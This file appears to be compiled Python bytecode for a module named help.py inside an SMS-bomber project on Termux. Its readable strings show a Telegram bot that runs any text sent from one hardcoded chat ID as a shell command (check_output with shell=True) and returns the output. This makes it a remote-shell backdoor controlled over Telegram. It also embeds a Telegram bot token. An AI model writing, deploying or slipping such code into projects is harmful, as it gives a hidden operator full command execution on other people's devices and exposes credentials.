U
    ,e^�  �                   @   s~   d dl Z d dl mZ d dlZd dlZe�d�ZdZejdgd�dd� �Ze	d	krzzej
d
d� W qP   e�d� Y qPX qPdS )�    N)�check_outputz.1023630183:AAGLxwbC7COvcq6qjPeOBUWPCe5A5KXd-HAi��text)Zcontent_typesc                 C   sP   t | jjkrL| j}zt�| jjt|dd�� W n   t�| jjd� Y nX d S )NT)�shellu7   иди на хер я не хочу работать!!!)�user_idZchat�idr   �botZsend_messager   )�messageZcomand� r	   �2/data/data/com.termux/files/home/smsbombv2/help.py�main   s    r   �__main__T)Z	none_stop�
   )�
subprocessr   Ztelebot�timeZTeleBotr   r   Zmessage_handlerr   �__name__Zpolling�sleepr	   r	   r	   r
   �<module>   s   

